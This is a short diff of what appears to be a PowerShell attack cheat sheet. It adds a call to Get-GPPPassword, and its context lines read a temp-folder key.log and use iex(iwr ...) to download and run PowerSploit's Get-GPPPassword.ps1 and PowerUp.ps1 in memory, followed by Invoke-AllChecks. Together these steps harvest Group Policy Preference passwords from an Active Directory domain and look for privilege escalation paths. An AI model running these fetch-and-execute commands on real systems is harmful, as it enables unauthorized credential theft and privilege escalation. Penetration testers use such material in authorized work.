@@ -18,6 +18,7 @@ cat $env:temp\key.log
 
 # requires AD Domain
 iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1 -usebasicparsing)
+Get-GPPPassword
 
 iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 -usebasicparsing)
 Invoke-AllChecks
